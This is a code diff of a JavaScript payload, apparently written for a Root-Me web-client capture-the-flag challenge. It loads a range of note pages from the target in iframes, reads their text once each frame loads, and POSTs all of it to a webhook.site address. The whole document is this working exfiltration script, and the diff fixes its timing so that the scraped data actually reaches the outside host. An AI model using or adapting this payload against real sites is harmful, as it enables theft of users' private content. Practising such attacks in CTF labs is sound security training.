@@ -2,34 +2,36 @@
 const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
 const WEBHOOK = "https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864";
 
-function sleep(ms) {
-    const end = Date.now() + ms;
-    while (Date.now() < end) {}
-}
-
 function run(a = 2800, b = 2840) {
     let results = [];
+    let loadedCount = 0;
+    const total = b - a;
 
     for (let i = a; i < b; i++) {
         const iframe = document.createElement("iframe");
         iframe.src = TARGET + i;
 
+        iframe.onload = () => {
+            results.push({
+                id: i,
+                data: iframe.contentDocument.body.textContent
+            });
+
+            loadedCount++;
+
+            if (loadedCount === total) {
+                fetch(WEBHOOK, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(results)
+                });
+                console.log("All data sent");
+            }
+        };
+
         document.body.appendChild(iframe);
-
-        results.push({
-            id: i,
-            data: iframe.contentDocument.body.textContent
-        });
     }
-
-    fetch(WEBHOOK, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(results)
-    });
 }
-
-
 
 run();
 </script>
